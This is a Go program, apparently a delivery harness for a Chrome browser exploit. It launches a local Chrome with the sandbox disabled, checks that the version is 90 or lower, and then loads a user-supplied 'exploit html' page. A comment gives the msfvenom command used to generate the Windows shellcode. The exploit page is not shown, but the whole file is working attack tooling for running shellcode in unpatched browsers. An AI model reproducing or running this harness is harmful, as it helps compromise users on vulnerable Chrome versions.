package main

import (
	"context"
	"flag"
	"fmt"
	"github.com/chromedp/chromedp"
	"log"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"time"
)

//tips:其中shellcode由msfvenom生成，命令：msfvenom -p windows/x64/exec cmd=mstsc.exe -f csharp
var(
	target=flag.String("s","","the exploit html")
	chromePath=[]string{
		// Unix-like
		"headless_shell",
		"headless-shell",
		"chromium",
		"chromium-browser",
		"google-chrome",
		"google-chrome-stable",
		"google-chrome-beta",
		"google-chrome-unstable",
		"/usr/bin/google-chrome",

		// Windows
		"chrome",
		"chrome.exe", // in case PATHEXT is misconfigured
		`C:\Program Files (x86)\Google\Chrome\Application\chrome.exe`,
		`C:\Program Files\Google\Chrome\Application\chrome.exe`,
		`C:\Users\Administrator\AppData\Local\Google\Chrome\Application\chrome.exe`,

		// Mac
		`/Applications/Google Chrome.app/Contents/MacOS/Google Chrome`,
	}
)
func findExecPath() string {
	user,err:=user.Current()
	var myChromePath []string
	if err==nil && runtime.GOOS=="windows"{
		myChromePath=append(chromePath,user.HomeDir+`\AppData\Local\Google\Chrome\Application\chrome.exe`)
	}else{
		myChromePath=chromePath
	}
	for _, path := range myChromePath{
		found, err := exec.LookPath(path)
		if err == nil {
			return found
		}
	}
	// Fall back to something simple and sensible, to give a useful error
	// message.
	return "google-chrome"
}

func task(target string)chromedp.Tasks{
	return chromedp.Tasks{
		chromedp.Navigate(target),
	//	file:///C:/Users/john/Desktop/1195777.html
	}
}
func main() {
	flag.Parse()
	if *target==""{
		fmt.Println("input url or local html")
		os.Exit(1)
	}
	path:=findExecPath()
	ctx,_:=chromedp.NewExecAllocator(
		context.Background(),
		append(
			chromedp.DefaultExecAllocatorOptions[:],
			chromedp.Flag("no-sandbox",true),
			chromedp.Flag("headless", false),
			chromedp.Flag("disable-gpu",true),
			chromedp.ExecPath(path),
			)...,
		)
	chromeCtx,_:=chromedp.NewContext(ctx,chromedp.WithLogf(log.Printf))
	timeoutCtx,_:=context.WithTimeout(chromeCtx,5*time.Second)
	var ver string
	err:=chromedp.Run(timeoutCtx,
		chromedp.Navigate(`chrome://version/`),
		chromedp.WaitVisible(`#version`),
		chromedp.OuterHTML(`document.querySelector("#version > span:nth-child(1)")`, &ver, chromedp.ByJSPath),
		)
	if err!=nil{
		fmt.Println(err)
		return
	}
	//<span>90.0.4430.72</span>
	temp:=strings.Split(ver,".")
	ver=strings.TrimLeft(temp[0],`<span>`)
	if num,_:=strconv.Atoi(ver);num<=90{
		e:=chromedp.Run(timeoutCtx,task(*target))
		if e!=nil{
			fmt.Println(e)
			return
		}
	}else {
		chromedp.Cancel(timeoutCtx)
	}
}
